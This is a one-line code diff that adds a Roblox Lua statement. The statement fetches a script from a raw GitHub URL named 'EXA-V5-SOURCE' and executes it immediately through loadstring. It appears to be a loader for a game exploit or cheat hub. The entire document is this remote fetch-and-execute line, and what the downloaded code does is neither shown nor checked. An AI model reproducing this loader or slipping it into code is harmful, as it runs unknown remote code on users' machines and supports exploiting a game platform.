@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bruh980/EXA-V5-SOURCE/main/Source%20of%20code%20EXA%20V5%20BETA"))();
